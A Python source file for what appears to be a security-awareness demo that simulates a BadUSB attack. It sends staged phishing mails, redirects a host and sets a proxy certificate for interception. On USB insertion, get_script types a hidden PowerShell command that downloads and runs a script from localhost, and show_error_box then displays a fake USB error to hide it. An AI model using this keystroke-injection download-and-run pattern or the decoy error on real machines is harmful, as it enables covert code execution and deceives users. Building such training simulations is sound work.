#!/usr/bin/env python3

import sys
import threading
import logging
import time
import importlib.resources
import subprocess  # nosec
import ipaddress

from tkinter import messagebox
from nativeapp.utils.mail import mail_client, mail_program
from nativeapp.utils.browser import browser_program
from nativeapp.utils.admin import admin_app
from nativeapp.config import config
from pynput.keyboard import Controller, Key

from typing import List

from . import set_proxy_cert

if sys.platform == "win32":
    import wmi
    import pythoncom


def get_ipv4(interface: str) -> ipaddress.IPv4Address:
    prefix = ""
    if sys.platform == "win32":
        prefix = "wsl"

    # akw not working in wsl
    cmd = [f"{prefix}", "bash", "-c",
           f"ip a | grep {interface} | grep inet"]
    logging.info(f"Calling {cmd}")
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE,  # nosec
                         stderr=subprocess.PIPE)
    out, _ = p.communicate()
    logging.info(f"got my data {out}")
    logging.info(f"got data {out.split()}")
    out = out.split()[1]
    logging.info(f"Output: {out}")
    net = ipaddress.IPv4Interface(out.decode())
    return net.ip


class DuckyDemo:

    def __init__(self):
        self.email_client = mail_client.MailClient(
                "127.0.0.1",
                993,
                465,
                "max.mustermann@mpseinternational.com",
                "123")
        mail_profile = importlib.resources.path(
                "nativeapp.resources.mail", "mpse_profile.zip")
        browser_profile = importlib.resources.path(
                "nativeapp.resources.edge", "profile_uhh.zip")
        self.email_program = mail_program.MailProgramThunderbird(
                "MPSE", mail_profile)
        self.browser_program = browser_program.BrowserProgramEdge(
                "elite.uhh_mitm", browser_profile)

        self.running = False
        self.usb_thread = None
        self.admin_client = admin_app.NativeappAdminClient()

    def start_usb_monitor(self):
        if sys.platform == "win32":
            pythoncom.CoInitialize()
            raw_wql = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA \'Win32_USBHub\'"  # noqa: E501
            c = wmi.WMI()
            watcher = c.watch_for(raw_wql=raw_wql)
            logging.info("Starting usb watcher")
            while self.running:
                try:
                    usb = watcher(timeout_ms=100)
                    if usb is not None:
                        logging.info(f"USB Properties: \n{usb}")
                        self.get_script()
                        self.show_error_box()
                        break
                except wmi.x_wmi_timed_out:
                    pass
            pythoncom.CoUninitialize()
        else:
            pass

    def start(self):
        if self.running:
            self.stop()
        # disable usb

        # set hosts entry
        self.running = True
        self.email_program.copy_profile()
        self.browser_program.copy_profile()
        self.usb_thread = threading.Thread(target=self.start_usb_monitor)
        self.usb_thread.start()

        # get wsl ip
        ip = get_ipv4("eth0")

        self.admin_client.send_command(
                admin_app.NativeappCommands.DISABLE_USB, b"1")
        self.admin_client.send_command(
                admin_app.NativeappCommands.SET_REDIRECT,
                admin_app.create_host_payload(
                    True, "elite-projekt.de", f"{ip}"))

        while not self.email_client.wait_for_smtp_server(20):
            pass
        self.send_mails()

        while not self.email_client.wait_for_imap_server(20):
            pass

        self.browser_program.start()
        self.email_program.start()

    def stop(self):
        self.running = False
        logging.info("Stopping mail program")
        self.email_program.stop()
        self.browser_program.stop()
        logging.info("Disabling proxy")
        set_proxy_cert.disable_proxy()
        logging.info("reverting admin settings")
        self.admin_client.send_command(
                admin_app.NativeappCommands.DISABLE_USB, b"0")
        self.admin_client.send_command(
                admin_app.NativeappCommands.SET_REDIRECT,
                admin_app.create_host_payload(
                    False, "elite-projekt.de"))
        logging.info("Waiting for usb thread")
        if self.usb_thread is not None and self.usb_thread.is_alive():
            self.usb_thread.join()
        logging.info("Stop done")

    def _send_mail(self, mail_files: List[str]) -> None:
        for mail_file in mail_files:
            mail_path = (importlib.resources.path(
                "nativeapp.resources.mail", mail_file))
            logging.info(f"Getting path for file {mail_file}: {mail_path}")
            self.email_client.send_mail_from_file(mail_path, (0, 0))

    def send_mails(self) -> None:
        # TODO: proper language
        if (config.EnvironmentConfig.LANGUAGE == "de"):
            self._send_mail(["bilder.yml"])
        else:
            self._send_mail(["bilder_en.yml"])

    def send_second_mail(self) -> None:
        if (config.EnvironmentConfig.LANGUAGE == "de"):
            self._send_mail(["falscher_stick.yml"])
        else:
            self._send_mail(["falscher_stick_en.yml"])

    def add_cert(self) -> None:
        set_proxy_cert.add_cert()
        set_proxy_cert.enable_and_set_proxy()

    def get_script(self) -> None:
        keyboard = Controller()
        keystroke_injection_sleeps = 0.5
        hostname = "127.0.0.1"
        filename = "a.py"
        keyboard.press(Key.cmd)
        keyboard.press("r")
        keyboard.release(Key.cmd)
        keyboard.release("r")
        time.sleep(keystroke_injection_sleeps)
        keyboard.type("powershell -Windowstyle hidden curl.exe -k https://{0}/{1} -s -o $ENV:Temp/{1} ; python $ENV:Temp/{1}".format(hostname, filename))  # noqa: E501

        time.sleep(keystroke_injection_sleeps)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)

    def show_error_box(self) -> None:
        error_title = "USB device not recognized (Error 10)"
        error_msg = "The last USB device you connected to this computer malfunctioned, and Windows does not recognize it"  # noqa: E501
        if (config.EnvironmentConfig.LANGUAGE == "de"):
            error_title = "Problem mit dem USB-Gerät (Fehlercode 10)"
            error_msg = "Es ist ein Fehler bei der Enumerierung des Gerätes \
                     unterlaufen. Bitte prüfen Sie, ob das Gerät korrekt \
                     angeschlossen ist und alle Treiber installiert sind. \
                     (Fehlercode 10)"

        messagebox.showerror(error_title, error_msg)
